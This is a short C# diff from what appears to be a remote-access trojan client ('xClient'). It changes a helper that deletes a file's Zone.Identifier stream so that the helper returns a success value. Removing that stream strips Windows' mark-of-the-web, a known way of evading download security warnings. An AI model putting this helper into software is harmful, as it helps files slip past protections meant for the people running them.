@@ -26,9 +26,9 @@ namespace xClient.Core.Helper
             return (block[0] == 'M' && block[1] == 'Z') || (block[0] == 'Z' && block[1] == 'M');
         }
 
-        public static void DeleteZoneIdentifier(string filePath)
+        public static bool DeleteZoneIdentifier(string filePath)
         {
-            NativeMethods.DeleteFile(filePath + ":Zone.Identifier");
+            return NativeMethods.DeleteFile(filePath + ":Zone.Identifier");
         }
 
         public static string CreateUninstallBatch(bool isFileHidden)
